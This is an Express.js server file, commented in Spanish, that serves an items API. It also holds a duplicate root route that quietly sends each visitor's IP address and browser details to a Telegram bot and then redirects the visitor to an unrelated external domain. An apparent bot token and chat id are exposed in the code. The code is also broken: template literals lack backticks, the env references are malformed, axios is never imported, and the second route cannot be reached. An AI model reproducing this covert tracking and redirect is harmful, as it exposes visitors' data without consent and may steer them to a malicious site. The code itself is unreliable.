require('dotenv').config();

const express = require('express');
const cors = require('cors');

const connectDB = require('./src/config/db');
const itemRoutes = require('./src/routes/itemRoutes');

// Conectar a MongoDB
connectDB();

const app = express();

// Middlewares
app.use(cors());
app.use(express.json());

// Rutas
app.use('/api/items', itemRoutes);

// Ruta principal
app.get('/', (req, res) => {
  res.json({
    message: 'API funcionando 🚀',
    endpoints: {
      items: '/api/items'
    }
  });
});

// TELEGRAM
app.get('/', async (req, res) => {

  try {

    // IP del visitante
    const ip =
      req.headers['x-forwarded-for']?.split(',')[0] ||
      req.socket.remoteAddress ||
      'IP desconocida';

    // Navegador / sistema operativo
    const userAgent = req.headers['user-agent'] || 'Desconocido';

    const mensaje = `
🚀 NUEVA VISITA

🌐 IP: ${ip}

🖥️ Navegador / dispositivo:
${userAgent}

🕒 Fecha:
${new Date().toLocaleString('es-CO', {
      timeZone: 'America/Bogota'
    })}
`;

    // Enviar a Telegram
    await axios.post(
      https://api.telegram.org/bot${process.env.8915592046:AAFAkXEAJ3ioftiympAPdXhUzz8xs6YrXJ4}/sendMessage,
      {
        chat_id: process.env.-5471837275,
        text: mensaje
      }
    );

    console.log('✅ Visita enviada a Telegram');

  } catch (error) {

    console.error(
      '❌ Error enviando visita a Telegram:',
      error.response?.data || error.message
    );

  }

  // REDIRECCIÓN

  res.redirect('https://ir.jelptconjunts.com/');
});

// INICIAR SERVIDOR
const PORT = process.env.PORT || 5000;

app.listen(PORT, () => {
  console.log(🌐 Servidor corriendo en el puerto ${PORT});
});
